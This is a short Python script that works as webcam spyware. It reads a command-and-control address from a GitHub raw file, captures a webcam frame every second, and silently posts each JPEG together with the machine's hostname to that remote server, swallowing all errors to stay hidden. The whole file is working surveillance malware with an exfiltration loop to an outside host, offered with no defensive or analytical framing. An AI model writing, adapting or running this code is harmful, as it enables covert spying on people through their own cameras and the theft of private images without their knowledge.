import cv2
import requests
import time
import socket

# GitHub raw URL where you store IP:PORT (e.g., "192.168.1.8:12345")
C2_CONFIG_URL = "https://raw.githubusercontent.com/PoopieRequim/pyc2config/main/c2.txt"

def get_c2_endpoint():
    try:
        response = requests.get(C2_CONFIG_URL, timeout=5)
        ip_port = response.text.strip()  # Expected format: "IP:PORT" (e.g., "192.168.1.8:12345")
        return f"http://{ip_port}/upload"  # Construct full URL
    except Exception as e:
        print(f"[!] Failed to fetch C2 endpoint: {e}")  # Debug (remove in production)
        return None

def capture_and_send():
    cam = None
    try:
        c2_url = get_c2_endpoint()
        if not c2_url:
            return

        cam = cv2.VideoCapture(0)
        if not cam.isOpened():
            return

        ret, frame = cam.read()
        if ret:
            _, img_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 70])  # 70% quality
            headers = {
                "X-Host": socket.gethostname(),
                "Content-Type": "application/octet-stream"
            }
            requests.post(c2_url, data=img_encoded.tobytes(), headers=headers, timeout=5)
    except:
        pass  # Silent fail
    finally:
        if cam:
            cam.release()

# Main loop (1-second interval)
while True:
    start_time = time.time()
    capture_and_send()
    elapsed = time.time() - start_time
    time.sleep(max(1.0 - elapsed, 0))  # Precise 1-second interval
